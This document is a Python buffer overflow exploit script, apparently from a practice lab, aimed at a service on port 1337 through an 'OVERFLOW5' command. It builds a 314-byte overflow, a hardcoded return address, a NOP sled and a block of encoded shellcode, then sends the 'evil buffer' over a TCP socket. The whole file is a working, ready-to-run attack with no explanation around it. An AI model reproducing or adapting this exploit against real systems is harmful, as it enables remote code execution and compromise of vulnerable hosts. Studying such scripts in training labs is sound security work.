#!/usr/bin/env python3

import socket

ip = "10.10.60.34"
port = 1337

prefix = "OVERFLOW5 "
offset = 314
overflow = "A" * offset
retn = "\xbb\x11\x50\x62" # 625011bb
padding = "\x90" * 16
payload = ("\xfc\xbb\x0e\xcb\xc2\x8d\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xf2\x23\x40\x8d\x0a"
"\xb4\x25\x07\xef\x85\x65\x73\x64\xb5\x55\xf7\x28\x3a\x1d\x55"
"\xd8\xc9\x53\x72\xef\x7a\xd9\xa4\xde\x7b\x72\x94\x41\xf8\x89"
"\xc9\xa1\xc1\x41\x1c\xa0\x06\xbf\xed\xf0\xdf\xcb\x40\xe4\x54"
"\x81\x58\x8f\x27\x07\xd9\x6c\xff\x26\xc8\x23\x8b\x70\xca\xc2"
"\x58\x09\x43\xdc\xbd\x34\x1d\x57\x75\xc2\x9c\xb1\x47\x2b\x32"
"\xfc\x67\xde\x4a\x39\x4f\x01\x39\x33\xb3\xbc\x3a\x80\xc9\x1a"
"\xce\x12\x69\xe8\x68\xfe\x8b\x3d\xee\x75\x87\x8a\x64\xd1\x84"
"\x0d\xa8\x6a\xb0\x86\x4f\xbc\x30\xdc\x6b\x18\x18\x86\x12\x39"
"\xc4\x69\x2a\x59\xa7\xd6\x8e\x12\x4a\x02\xa3\x79\x03\xe7\x8e"
"\x81\xd3\x6f\x98\xf2\xe1\x30\x32\x9c\x49\xb8\x9c\x5b\xad\x93"
"\x59\xf3\x50\x1c\x9a\xda\x96\x48\xca\x74\x3e\xf1\x81\x84\xbf"
"\x24\x05\xd4\x6f\x97\xe6\x84\xcf\x47\x8f\xce\xdf\xb8\xaf\xf1"
"\x35\xd1\x5a\x08\xde\xd4\x9e\x3a\xc6\x81\x9c\x3a\xe7\x0d\x28"
"\xdc\x6d\xbe\x7c\x77\x1a\x27\x25\x03\xbb\xa8\xf3\x6e\xfb\x23"
"\xf0\x8f\xb2\xc3\x7d\x83\x23\x24\xc8\xf9\xe2\x3b\xe6\x95\x69"
"\xa9\x6d\x65\xe7\xd2\x39\x32\xa0\x25\x30\xd6\x5c\x1f\xea\xc4"
"\x9c\xf9\xd5\x4c\x7b\x3a\xdb\x4d\x0e\x06\xff\x5d\xd6\x87\xbb"
"\x09\x86\xd1\x15\xe7\x60\x88\xd7\x51\x3b\x67\xbe\x35\xba\x4b"
"\x01\x43\xc3\x81\xf7\xab\x72\x7c\x4e\xd4\xbb\xe8\x46\xad\xa1"
"\x88\xa9\x64\x62\xa8\x4b\xac\x9f\x41\xd2\x25\x22\x0c\xe5\x90"
"\x61\x29\x66\x10\x1a\xce\x76\x51\x1f\x8a\x30\x8a\x6d\x83\xd4"
"\xac\xc2\xa4\xfc\xac\xe4\x5a\xff")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")